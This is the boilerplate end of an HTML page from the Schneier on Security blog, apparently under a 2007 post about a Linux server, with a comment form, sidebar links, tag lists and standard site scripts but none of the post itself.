		<h2 class="comments-open-header">Leave a comment <small><a rel="nofollow" id="cancel-comment-reply-link" href="/blog/archives/2007/08/how_a_linux_ser.html#respond" style="display:none;">Cancel reply</a></small></h2><form action="https://www.schneier.com/wp-comments-post.php" method="post" id="commentform" class="comment-form" novalidate><a href="https://www.schneier.com/wp-login.php?redirect_to=https%3A%2F%2Fwww.schneier.com%2Fblog%2Farchives%2F2007%2F08%2Fhow_a_linux_ser.html" title="Login">Login</a><p class="comment-form-author"><label for="author">Name</label> <input id="author" name="author" type="text" value="" size="30" maxlength="245" /></p>
<p class="comment-form-email"><label for="email">Email</label> <input id="email" name="email" type="email" value="" size="30" maxlength="100" /></p>
<p class="comment-form-url"><label for="url">URL:</label> <input id="url" name="url" type="url" value="" size="30" maxlength="200" /></p>
<p class="comment-form-cookies-consent"><input id="wp-comment-cookies-consent" name="wp-comment-cookies-consent" type="checkbox" value="yes" /> <label for="wp-comment-cookies-consent">Remember personal info?</label></p>

<p class="comment-form-author">

	<label for="comm_capt_challenge">
		Fill in the blank: the name of this blog is Schneier on ___________ (required):	</label>

	<input id="comm_capt_challenge" name="comm_capt_challenge" size="30" type="text" />
</p>

<div class="comment-form-comment">

	<label for="comment">Comments:</label>

	<textarea id="comment" name="comment" cols="45" rows="8" maxlength="65525" required="required"></textarea>

	<div id="preview-box" class="preview-box hide"></div>
	<img class="comment-loading hide" src="https://149400697.v2.pressablecdn.com/wp-content/themes/schneier/assets/images/loader.gif" />

</div>

<p id="allowed">

	<strong>Allowed HTML</strong>
	&lt;a href=&quot;URL&quot;&gt; &bull; &lt;em&gt; &lt;cite&gt; &lt;i&gt; &bull; &lt;strong&gt; &lt;b&gt; &bull; &lt;sub&gt; &lt;sup&gt; &bull; &lt;ul&gt; &lt;ol&gt; &lt;li&gt; &bull; &lt;blockquote&gt; &lt;pre&gt;
	<strong>Markdown Extra</strong> syntax via <a href="https://michelf.ca/projects/php-markdown/extra/">https://michelf.ca/projects/php-markdown/extra/</a>
</p>

<input type="hidden" id="wp_comment_nonce" name="wp_comment_nonce" value="4b1534b792" /><input type="hidden" name="_wp_http_referer" value="/blog/archives/2007/08/how_a_linux_ser.html" />
<input type="button" id="comment-preview" class="comment-preview comment-actions" value="Preview" />
<input type="button" id="comment-write" class="comment-write comment-actions hide" value="Edit" />

<p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="Submit" /> <input type='hidden' name='comment_post_ID' value='1729' id='comment_post_ID' />
<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
</p></form>	</div><!-- #respond -->
	
	<div class="stepthrough">
		<a href="https://www.schneier.com/blog/archives/2007/08/vague_threat_pr.html" rel="prev">â† Vague Threat Prompts Overreaction</a>		<a href="https://www.schneier.com/blog/archives/2007/08/wholesale_autom.html" rel="next">Wholesale Automobile Surveillance Comes to New York City â†’</a>	</div>

	
<p id="powered">Sidebar photo of Bruce Schneier by Joe MacInnis.</p>
		</div>

		
<aside>
	<div class="sidebar" id="sidebar-two">
		<section><div class="sidesection widget widget_schneier_about" id="schneier_about-2"><h3>About Bruce Schneier</h3><img src="https://149400697.v2.pressablecdn.com/wp-content/uploads/2019/10/Bruce-Schneier.jpg" /><p><p class="small">I am a <a href="https://public-interest-tech.com/">public-interest technologist</a>, working at the intersection of security, technology, and people. I've been writing about security issues on my <a href="/">blog</a> since 2004, and in my monthly <a href="/crypto-gram/">newsletter</a> since 1998. I'm a fellow and lecturer at Harvard's <a href="https://www.hks.harvard.edu/faculty/bruce-schneier">Kennedy School</a>, a board member of <a href="https://www.eff.org/">EFF</a>, and the Chief of Security Architecture at <a href="https://inrupt.com/">Inrupt, Inc.</a> This personal website expresses the opinions of none of those organizations.</p>
</p></div></section><section><div class="sidesection widget widget_schneier_related_posts" id="schneier_related_posts-2"><h3>Related Entries</h3>
<ul>

	<li><a href="https://www.schneier.com/blog/archives/2021/03/illegal-content-and-the-blockchain.html">Illegal Content and the Blockchain</a></li><li><a href="https://www.schneier.com/blog/archives/2021/03/national-security-risks-of-late-stage-capitalism.html">National Security Risks of Late-Stage Capitalism</a></li><li><a href="https://www.schneier.com/blog/archives/2021/02/weis-2021-call-for-papers.html">WEIS 2021 Call for Papers</a></li><li><a href="https://www.schneier.com/blog/archives/2021/02/ransomware-profitability.html">Ransomware Profitability</a></li><li><a href="https://www.schneier.com/blog/archives/2021/02/presidential-cybersecurity-and-pelotons.html">Presidential Cybersecurity and Pelotons</a></li><li><a href="https://www.schneier.com/blog/archives/2021/01/police-have-disrupted-the-emotet-botnet.html">Police Have Disrupted the Emotet Botnet</a></li>
</ul>
</div></section><section><div class="sidesection widget widget_schneier_featured_essays" id="schneier_featured_essays-2"><h3>Featured Essays</h3>
	<ul>
		<li><a href="https://www.schneier.com/essays/archives/2016/04/the_value_of_encrypt.html">The Value of Encryption</a></li><li><a href="https://www.schneier.com/essays/archives/2016/03/data_is_a_toxic_asse.html">Data Is a Toxic Asset, So Why Not Throw It Out?</a></li><li><a href="https://www.schneier.com/essays/archives/2014/01/how_the_nsa_threaten.html">How the NSA Threatens National Security</a></li><li><a href="https://www.schneier.com/essays/archives/2009/01/terrorists_may_use_g.html">Terrorists May Use Google Earth, But Fear Is No Reason to Ban It</a></li><li><a href="https://www.schneier.com/essays/archives/2007/01/in_praise_of_securit.html">In Praise of Security Theater</a></li><li><a href="https://www.schneier.com/essays/archives/2006/08/refuse_to_be_terrori.html">Refuse to be Terrorized</a></li><li><a href="https://www.schneier.com/essays/archives/2006/05/the_eternal_value_of.html">The Eternal Value of Privacy</a></li><li><a href="https://www.schneier.com/essays/archives/2005/09/terrorists_dont_do_m.html">Terrorists Don&#039;t Do Movie Plots</a></li>	</ul>

	<p><a href="https://www.schneier.com/essays/">More Essays</a></p></div></section><section><div class="sidesection widget widget_schneier_archives" id="schneier_archives-2"><h3>Blog Archives</h3>
<ul>

	<li><a href="https://www.schneier.com/blog/calendar.html/">Archive by Month</a></li><li><a href="https://www.schneier.com/blog/newcomments.html/">100 Latest Comments</a></li></ul>

<h4>Blog Tags</h4><ul class="top-tags"><li><a href="https://www.schneier.com/tag/3d-printers/">3d printers</a></li><li><a href="https://www.schneier.com/tag/9-11/">9/11</a></li><li><a href="https://www.schneier.com/tag/aaron-swartz/">Aaron Swartz</a></li><li><a href="https://www.schneier.com/tag/academic/">academic</a></li><li><a href="https://www.schneier.com/tag/academic-papers/">academic papers</a></li><li><a href="https://www.schneier.com/tag/accountability/">accountability</a></li><li><a href="https://www.schneier.com/tag/aclu/">ACLU</a></li><li><a href="https://www.schneier.com/tag/activism/">activism</a></li><li><a href="https://www.schneier.com/tag/adobe/">Adobe</a></li><li><a href="https://www.schneier.com/tag/advanced-persistent-threats/">advanced persistent threats</a></li><li><a href="https://www.schneier.com/tag/adware/">adware</a></li><li><a href="https://www.schneier.com/tag/aes/">AES</a></li><li><a href="https://www.schneier.com/tag/afghanistan/">Afghanistan</a></li><li><a href="https://www.schneier.com/tag/air-marshals/">air marshals</a></li><li><a href="https://www.schneier.com/tag/air-travel/">air travel</a></li><li><a href="https://www.schneier.com/tag/airgaps/">airgaps</a></li><li><a href="https://www.schneier.com/tag/al-qaeda/">al Qaeda</a></li><li><a href="https://www.schneier.com/tag/alarms/">alarms</a></li><li><a href="https://www.schneier.com/tag/algorithms/">algorithms</a></li><li><a href="https://www.schneier.com/tag/alibis/">alibis</a></li><li><a href="https://www.schneier.com/tag/amazon/">Amazon</a></li><li><a href="https://www.schneier.com/tag/android/">Android</a></li><li><a href="https://www.schneier.com/tag/anonymity/">anonymity</a></li><li><a href="https://www.schneier.com/tag/anonymous/">Anonymous</a></li><li><a href="https://www.schneier.com/tag/antivirus/">antivirus</a></li><li><a href="https://www.schneier.com/tag/apache/">Apache</a></li><li><a href="https://www.schneier.com/tag/apple/">Apple</a></li><li><a href="https://www.schneier.com/tag/applied-cryptography/">Applied Cryptography</a></li><li><a href="https://www.schneier.com/tag/artificial-intelligence/">artificial intelligence</a></li><li><a href="https://www.schneier.com/tag/assassinations/">assassinations</a></li></ul><p><a href="https://www.schneier.com/blog/tags.html/">More Tags</a></p></div></section><section><div class="sidesection widget widget_schneier_latest_book" id="schneier_latest_book-3"><h3>Latest Book</h3><a href="https://www.schneier.com/books/click-here/"><img class="sidepic" alt="Click Here to Kill Everybody" src="https://149400697.v2.pressablecdn.com/wp-content/uploads/2018/07/book-ch2-200w.png" /></a><p><a href="https://www.schneier.com/books/">More Books</a></p></div></section><section><div class="sidesection widget widget_schneier_promotion" id="schneier_promotion-2">
<a href="https://www.eff.org/issues/bloggers/legal/join">
	<img src="https://149400697.v2.pressablecdn.com/wp-content/themes/schneier/assets/images/join-eff@2x.png" id="effbutton" alt="Support Bloggers' Rights!" title="Support Bloggers' Rights!" /></a>

<a href="https://npo.networkforgood.org/Donate/Donate.aspx?npoSubscriptionId=8252">
	<img src="https://149400697.v2.pressablecdn.com/wp-content/themes/schneier/assets/images/support-epic@2x.png" alt="Defend Privacy--Support Epic" title="Defend Privacy--Support Epic" /></a>
</div></section>	</div>
</aside>

		<footer>
			<nav>
				<div class="nav" id="footer-nav">
					<div class="menu-main-menu-container"><ul id="menu-main-menu-1" class="menu"><li class="menu1 menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-50175 current-menu-item"><a href="https://www.schneier.com">Blog</a></li>
<li class="menu2 menu-item menu-item-type-post_type menu-item-object-page menu-item-50916"><a href="https://www.schneier.com/crypto-gram/">Newsletter</a></li>
<li class="menu3 menu-item menu-item-type-post_type menu-item-object-page menu-item-50166"><a href="https://www.schneier.com/books/">Books</a></li>
<li class="menu4 menu-item menu-item-type-custom menu-item-object-custom menu-item-50169"><a href="https://www.schneier.com/essays/">Essays</a></li>
<li class="menu5 menu-item menu-item-type-custom menu-item-object-custom menu-item-50170"><a href="https://www.schneier.com/news/">News</a></li>
<li class="menu6 menu-item menu-item-type-custom menu-item-object-custom menu-item-50171"><a href="https://www.schneier.com/talks/">Talks</a></li>
<li class="menu7 menu-item menu-item-type-post_type menu-item-object-page menu-item-50167"><a href="https://www.schneier.com/academic/">Academic</a></li>
<li class="menu8 menu-item menu-item-type-post_type menu-item-object-page menu-item-50174"><a href="https://www.schneier.com/blog/about/">About Me</a></li>
</ul></div>				</div>
			</nav>
		</footer>

		</div><!--#main-->
	</div><!--#wrapper-->

		<script type="text/javascript">
		(function () {
			var c = document.body.className;
			c = c.replace(/woocommerce-no-js/, 'woocommerce-js');
			document.body.className = c;
		})();
	</script>
	<script type='text/javascript' src='https://c0.wp.com/p/woocommerce/5.1.0/assets/js/jquery-cookie/jquery.cookie.min.js' id='jquery-cookie-js'></script>
<script type='text/javascript' src='https://149400697.v2.pressablecdn.com/wp-content/themes/schneier/assets/vendor/socialshareprivacy/js/socialshareprivacy.js?ver=1.0.1' id='social-share-privacy-js'></script>
<script type='text/javascript' id='social-share-privacy-icons-js-extra'>
/* <![CDATA[ */
var schneierSocial = {"path":"https:\/\/www.schneier.com\/wp-content\/themes\/schneier\/assets\/vendor\/socialshareprivacy\/"};
/* ]]> */
</script>
<script type='text/javascript' src='https://149400697.v2.pressablecdn.com/wp-content/themes/schneier/assets/vendor/socialshareprivacy/js/icons.js?ver=1.0.0' id='social-share-privacy-icons-js'></script>
<script type='text/javascript' id='schneier-comment-js-extra'>
/* <![CDATA[ */
var schneierComment = {"translateErrorSecurityAnswerWrong":"Your response to the challenge question ('The name of this blog is Schneier on ____') was not correct. Please try again.","ajax_url":"https:\/\/www.schneier.com\/wp-admin\/admin-ajax.php"};
/* ]]> */
</script>
<script type='text/javascript' src='https://149400697.v2.pressablecdn.com/wp-content/themes/schneier/assets/js/comment.js?ver=1.0.1' id='schneier-comment-js'></script>
<script type='text/javascript' src='https://c0.wp.com/c/5.7/wp-includes/js/wp-embed.min.js' id='wp-embed-js'></script>

</body>

</html>
